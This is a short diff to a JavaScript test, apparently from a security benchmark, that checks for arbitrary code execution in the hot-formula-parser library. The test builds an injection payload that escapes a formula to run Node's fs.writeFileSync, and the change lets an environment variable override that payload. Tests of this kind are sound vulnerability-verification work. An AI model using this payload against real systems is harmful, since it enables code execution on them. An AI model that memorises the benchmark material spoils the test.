@@ -3,7 +3,7 @@ test("Arbitrary code execution in hot-formula-parser", () => {
   const fs = require("fs");
   const FormulaParser = require("hot-formula-parser").Parser;
   const path = "./hot-formula-parser";
-  let payload = "red(); require('fs').writeFileSync('" + path + "',``); //";
+  let payload = process.env.SECBENCH_PAYLOAD || ("red(); require('fs').writeFileSync('") + path + "',``); //";
   data = {};
   file_exist = fs.existsSync(path);
   expect(file_exist).toBe(false);
